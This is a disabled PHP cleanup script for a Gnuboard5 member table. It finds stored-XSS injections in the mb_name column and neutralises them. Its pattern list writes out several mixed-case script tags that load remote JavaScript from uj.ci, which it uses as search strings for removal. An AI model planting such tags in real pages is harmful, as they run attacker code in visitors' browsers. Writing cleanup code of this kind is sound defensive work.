<?php
include_once("_common.php");
die();

$patterns = [
    '<sCRiPt sRC=//uj.ci/w1q></sCrIpT>',
    '<sCRiPt sRC=//uj.ci/pyy></sCrIpT>',
	'<sCRiPt sRC=//uj.ci/zru></sCrIpT>',
	'<sCRiPt sRC=//uj.ci/z7i></sCrIpT>',
	
	'<sCRiPtsRC=//uj.ci/w1q></sCrIpT>',
    '<sCRiPtsRC=//uj.ci/pyy></sCrIpT>',
	'<sCRiPtsRC=//uj.ci/zru></sCrIpT>',
	'<sCRiPtsRC=//uj.ci/z7i></sCrIpT>',
];
$replacements = [
    '<=//uj.ci/w1q></>',
    '<=//uj.ci/pyy></>',
	'<=//uj.ci/zru></>',
	'<=//uj.ci/z7i></>',
	
	'<=//uj.ci/w1q></>',
    '<=//uj.ci/pyy></>',
	'<=//uj.ci/zru></>',
	'<=//uj.ci/z7i></>',
];

// 대상 컬럼만 수동 지정 (자동 감지된 g5_member.mb_name)
$table = 'g5_member_20250611';
$column = 'mb_name';

// 해당 컬럼에서 포함된 레코드 가져오기
$sql = "SELECT * FROM `$table` WHERE `$column` LIKE '%uj.ci%'";
$res = sql_query($sql);

while ($row = sql_fetch_array($res)) {
    $pkCheck = sql_fetch("SHOW KEYS FROM `$table` WHERE Key_name = 'PRIMARY'");
    if (!$pkCheck) continue;

    $pk = $pkCheck['Column_name'];
    $id = $row[$pk];
    $original = $row[$column];
    $replaced = str_replace($patterns, $replacements, $original);

    if ($original !== $replaced) {
        $safe = sql_real_escape_string($replaced);
        $updateSql = "UPDATE `$table` SET `$column` = '{$safe}' WHERE `$pk` = '{$id}'";
        sql_query($updateSql);
        echo "[🔧 수정됨] {$table}.{$column} => {$id}\n";
    }
}
?>